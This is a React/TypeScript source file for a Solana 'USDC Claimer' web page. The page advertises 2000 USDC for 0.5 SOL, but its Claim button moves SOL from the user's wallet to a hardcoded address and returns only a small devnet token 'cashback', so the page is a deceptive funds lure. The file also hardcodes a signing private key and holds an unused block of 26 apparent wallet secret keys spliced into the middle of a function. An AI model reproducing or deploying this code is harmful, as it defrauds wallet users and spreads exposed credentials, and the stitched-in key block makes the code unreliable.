/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "58VZP8Gn5G7k2qf9vVke9wnQP3tiebqA5mmUMXTz7muaoX6sdVSAvH1df1EyVjPpnsjUanqjV85M4XLMUDDttRrp"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5wY57Vt22UgZ8Q8nCp1JB6rWsqztB5skUKSdrBFRxwssoYNwAfFBULkXQA4bjrC5igXtbVuQhn7kWdXkNktsWLUi",
  "key1": "4XvnTBiAsiBmpobv9Mm28TGCNPKkwFNkwd2hkK7sWucaCbQhTfZ3mQJBgFNmcP6ZMMjjULdJ9msRXEw7gcmEdyXA",
  "key2": "5CBVfAwr3odR3u7798Y45yvNXU4ZwsdPWuJjd5PHHgoeQmRJhHGioVCVCiet9WBab2pkPZU2mvK4dr4yiHK8BNzz",
  "key3": "2WyS2f3iDzuvJgeNaFTZt1wF9ZttG6D9TNqaWLXWdY1hW2YDfUDM9jWQvQ6azjTbfBrrkYQ8ioHNsVB6ikYTfmYh",
  "key4": "5BjBPtMQPAYtjaFPVe6tubVmQuAyPfQkhu6p2WDBp4wFYoc9Xf14nmZ1ftA5yq1SXcSppWqaTp9R9Sju9CbtLFHN",
  "key5": "3yjtC9SJBQzHx2KNGna2MNBAEbesi39Rt5mgP5QxL3EC2GmEqFJfgHU28a22D7GU9QvQYhTwvzKPZ1VGhL12QNHS",
  "key6": "5dxrjGiXF2XAkynhJyXWZSFXsSBKf6b3MDpj74ZBdSdk9817jDva5pXJuix32dcbXLpLNguKsPBoWUvuJWpZ6GnU",
  "key7": "21fpPXSEGmZd8xcStfU3sGZoKj1ciZFanVrxp4HsbsQGuzFEn2qbC9GHrhAPWXJmxMdupSADgx2umSTY3nbFLY7X",
  "key8": "5mCwEehZWcADtsXfQFk5bEUEatFAaUK9BNHyFG4Vehr6hJWq63R9vG9ULwpVoeSgLPnpAebyaDkpuav9G37TAL2c",
  "key9": "Z29DgsZ452Kg1zs4tde24juUuo6sAi2FS1JH5Weiv8quwkeNoK4GcWy8FrstSACkCHB6prtRz83Q5wdwd7HKfbg",
  "key10": "M7cCuEBn6xAMcHyt3gN2oXqYwccJGgw6nSN765ncVjNiFL3UDyCSPzTsk81Fs6sceTHsnScRBJHzWyNBoiYfhUH",
  "key11": "4b33d7HkFnwbin1T4DSirnY2dvf8WfnBaioUi9qWH6fYVF4nHjBv6aDiT7W1LXBkJoJFkQqAeHvTa2AvtZP1tVYU",
  "key12": "2NejHLgBcU8AZFWqNmNnHZxHCsQSCDME2NVqEkjr1jcS8Ya7zYJckgnDYV1YvXyZyDeVn7FHTU2dv3z5DjTJDnss",
  "key13": "52BQnb4EM8wqJAenf6jzUpHsTW2fJ9HwrsxQZcrn19zNsExZhicGWAeDmfyuokHABWpCDje8F22uoK5aVVvgqHTM",
  "key14": "5fHKnknudsuQWhrmJSNoaVL4WG3Yt7DHe7eucP2mUX1g8dqL4DXM1d2pbPZYespECqwCMpeXfhkk7tH68DvBxCQR",
  "key15": "ncyz7n3ZweirRAZp1gJ4kyJ52VFKjvpC2kgB4PEBhQpoQ2pZ8gRLeMEsXqLXB1mRvyhHxzZyc8TWWfZX3a9M9m2",
  "key16": "3btqiePz2yUX6hxhSeWvmkrDjTKci7ZbY4UJdDTV3CAxWSVLukCBwRQzemdaYd7K7K1y2HBmF85evCr1LBXwHTWR",
  "key17": "3RmFNTromJX3qrfwwJyfnQUCjBiNBjdc6uvhVGkFuaXNGHZjSVoa783KuS5a7qAiDqSxr3CjAmiA4o17gALDCsbM",
  "key18": "5LLH1upmxCcUS4wrHnZVemHPFNFaS2tgURusFnz6YTUd8Ax4WVQiSg2CNvxTCbNuGh3NxnpudxcscmT2tyVkv1ox",
  "key19": "Nm3oMRrJqii4XSWkf6gY8tqmi9A72eN5zSe43EbfpRR7VwQzuQTdF9jBXaV9fy8eyqZ7aiTB8CpQ1KNjJBMK54u",
  "key20": "4Q3cJkKGpkcP6hm9iM2hUscQmokcKBmBG8yg6Nzd85wvqU356sUeL4spmS76vP1jXRHxsPAhA47YUY9Wba6itPfE",
  "key21": "3oHsf7o3otWqnoU2JcC7BqPdS3LdVw1A2W8m1SkvPB5Qkvf6QvLv6TY8Xar9s4nSKu44XCYPi1XFJ9fJdCaQtPU",
  "key22": "4oUeeuBhHHQeYWVpeuJWcWxUgtQk7APoqJMuVkd4BFWbWD4shXsPinba1ge1wxHRmPGDE95SnbtRyqsKWM1F5Kc3",
  "key23": "Je2QKBFU8Sey4dS73g59MVmnyKvSmxdGJeSNuBAn7MexUctPv1f4haF9RQ8gqM7y5B7iGoWPDf7neGGdxkoNHiF",
  "key24": "3Xrg6pj4gQggNoMSYskZxUGUZ7yrLHtz7ZLzFxjuh3S4YrKeFzG5eLAMyUj17GSMww1dzpqzPkETwSmbSVwbZt2u",
  "key25": "55VajwvGqdCSCyQHNojMpUnABBGqJzkmZ19zNz6JANdExBnix2E3U6YM6VRdcVfDNfCZCkgLDvws39LTYDT5dv7L"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
